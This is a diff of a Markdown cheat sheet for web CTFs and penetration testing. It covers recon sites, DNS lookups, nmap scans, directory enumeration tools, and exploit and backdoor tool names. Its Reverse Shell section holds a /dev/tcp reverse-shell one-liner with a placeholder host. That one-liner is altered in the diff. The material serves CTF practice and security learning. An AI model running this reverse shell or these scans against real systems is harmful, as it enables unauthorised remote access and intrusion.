@@ -1,14 +1,14 @@
 # Web
-<!-- toc -->
-
 > [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
 > [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
 > [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
 > [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
 > [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
-> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
+> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)  
 > [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)  
 > [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+
+<!-- toc -->
 
 ## Tool
 
@@ -19,49 +19,81 @@
   - [Censys](https://search.censys.io/)
     > Censys helps organizations, individuals, and researchers find and monitor
     > every server on the Internet to reduce exposure and improve security
-  - Google Hacking
-    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
+  - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
 - Site Information
-  - maltego
   - [Netcraft Site Report](https://sitereport.netcraft.com/)
+    > Find out the infrastructure and technologies used by any site
   - [crt.sh](https://crt.sh/)
     > Enter an Identity (Domain Name, Organization Name, etc)
-  - [IANA WHOIS Service](https://www.iana.org/whois)
-  - [DomainTools](https://whois.domaintools.com/)
-- DNS
-  - drill
-  - dig
-  - nslookup
-  - host
-  - dnsenum
-  - knockpy.py
-  - [dnsdumpster](https://dnsdumpster.com/)
-  - [robtex](https://www.robtex.com/)
-    - Subdomains
-- Crawler
-  - dirb
-  - DirBuster
-  - git-dumper
-  - wfuzz
-    ```bash
-    wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
-    ```
-  - ffuf
+  - Domain Information
+    - [IANA WHOIS Service](https://www.iana.org/whois)
+    - [DomainTools](https://whois.domaintools.com/)
+    - [robtex](https://www.robtex.com/)
+      > Subdomains
+  - maltego
+    > A platform for open-source intelligence (OSINT) and cyber investigations
+- DNS Record
+  - DNS Lookup
 
-### Payload
+    | Usage | Description |
+    |:------|:------------|
+    | `$ dig ${server:+@${server}} ${name:?} ${type}` |
+    | `$ nslookup ${type:+-type=${type}} ${name:?} ${server}`
+    | `$ drill ${name:?} ${server:+@${server}} ${type}`
+
+  - DNS Reverse Lookup
+
+    | Usage | Description |
+    |:------|:------------|
+    | `$ dig ${server:+@${server}} -x ${addr:?}` |
+    | `$ nslookup ${addr:?}`
+    | `$ drill -x ${addr:?}`
+
+  - DNS Enumeration
+    - dnsenum
+    - knockpy.py
+    - [dnsdumpster](https://dnsdumpster.com/)
+
+- Site Enumeration
+  - Port Scanning
+
+    | Usage | Description |
+    |:------|:------------|
+    | `$ nmap -A ${host:?}` | Scan with default setting. |
+    | `$ nmap --script "http-*" -p 80 ${host:?}` | Scan HTTP service. |
+    | `$ nmap -T4 -sT -p T:1-65535 ${host:?}` | Scan all tcp port. |
+
+  - Directory Enumeration
+
+    | Usage | Description |
+    |:------|:------------|
+    | `$ gobuster dir --url ${url:?} --wordlist ${wordlist:-/usr/share/wordlists/dirb/common.txt}` | General scan. |
+    | `$ dirb ${url:?} ${wordlist}` |
+    | `$ dirbuster` |
+    | `$ dirsearch -u ${url:?}`
+    | `$ wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"` |
+    | `$ ffuf` |
+
+  - Dumper
+    - git-dumper
+
+### Exploit
 - Burpsuit
-- [Exploit DB](https://www.exploit-db.com/)
 - c-jwt-cracker
+- [Exploit DB](https://www.exploit-db.com/)
 - Scanner
+  - nikto
   - sqlmap
   - xsser
   - ZAP
+
+### Payload
 - Backdoor
   - weevely
   - veil
   - BeEF
 - Reverse Shell
-  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
+  - `$ bash -c "/bin/sh -i >& /dev/tcp/${HOST}/${PORT} 0<&1"`
   - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
 
 ### Connection
